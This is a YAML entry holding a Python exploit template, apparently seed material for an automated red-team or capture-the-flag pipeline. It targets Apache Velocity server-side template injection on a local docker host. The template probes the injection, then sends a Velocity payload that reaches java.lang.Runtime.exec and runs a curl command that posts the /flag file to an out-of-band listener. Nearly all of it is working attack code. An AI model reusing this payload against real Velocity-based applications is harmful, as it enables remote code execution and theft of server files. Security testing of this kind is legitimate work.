- name: seed-warmup-cwe-1336-template
  description: Warmup-generated executable exploit template for CWE-1336 Server-Side
    Template Injection (SSTI) via Apache Velocity leading to Remote Code Execution
  lang: python
  template: "import time\nimport urllib.parse\nimport redteam_sdk\n\nTARGET_URL =\
    \ \"http://host.docker.internal:9443\"\n\ndef main():\n    client = redteam_sdk.HttpClient(base_url=TARGET_URL)\n\
    \    oob = redteam_sdk.OOBReceiver(port=8765)\n    oob_url = oob.url\n    print(f\"\
    [*] OOB URL: {oob_url}\")\n\n    # Test SSTI\n    test_payload = \"#set($x=7*7)$x\"\
    \n    try:\n        resp = client.get(\"/\", params={\"text\": test_payload})\n\
    \        print(f\"[*] Test response (first 200 chars): {resp.text[:200]}\")\n\
    \        if \"49\" in resp.text:\n            print(\"[+] SSTI confirmed!\")\n\
    \        else:\n            print(\"[-] SSTI not detected, but continuing anyway\"\
    )\n    except Exception as e:\n        print(f\"[-] Test request failed: {e}\"\
    )\n\n    # Build command execution payload\n    command = f\"curl -X POST -d @/flag\
    \ {oob_url}\"\n    velocity_payload = (\n        '#set($s=\"\") '\n        '#set($stringClass=$s.getClass())\
    \ '\n        '#set($runtime=$stringClass.forName(\"java.lang.Runtime\").getMethod(\"\
    getRuntime\",null).invoke(null,null)) '\n        f'#set($proc=$runtime.exec(\"\
    {command}\")) '\n        '#set($null=$proc.waitFor())'\n    )\n    encoded_payload\
    \ = urllib.parse.quote(velocity_payload, safe='')\n    print(f\"[*] Sending RCE\
    \ payload...\")\n    try:\n        resp = client.get(\"/\", params={\"text\":\
    \ encoded_payload})\n        print(f\"[*] RCE response status: {resp.status_code}\"\
    )\n    except Exception as e:\n        print(f\"[-] RCE request failed: {e}\"\
    )\n        return\n\n    # Wait for OOB callback\n    print(\"[*] Waiting for\
    \ OOB callback...\")\n    time.sleep(5)  # give server time to execute curl\n\
    \    try:\n        # Attempt to wait for incoming HTTP request\n        req =\
    \ oob.wait_for_request(timeout=10)\n        if req:\n            data = req.body\n\
    \            print(f\"[+] Received data: {data}\")\n            if data:\n   \
    \             print(f\"[+] Flag: {data.decode(errors='ignore')}\")\n         \
    \   else:\n                print(\"[!] No data in request body\")\n        else:\n\
    \            print(\"[-] No OOB request received\")\n    except AttributeError:\n\
    \        # fallback if wait_for_request is not available\n        print(\"[*]\
    \ wait_for_request not found, trying pop_request()\")\n        time.sleep(3)\n\
    \        try:\n            req = oob.pop_request()\n            if req:\n    \
    \            print(f\"[+] Received: {req.body}\")\n            else:\n       \
    \         print(\"[-] No request\")\n        except Exception as e:\n        \
    \    print(f\"[-] OOB receive fallback failed: {e}\")\n    except Exception as\
    \ e:\n        print(f\"[-] OOB receive error: {e}\")\n\n    # Save context to\
    \ satisfy step communication requirement\n    redteam_sdk.save_context({\"flag_attempt\"\
    : True})\n    print(\"STEP_OK\")\n\nif __name__ == \"__main__\":\n    main()"
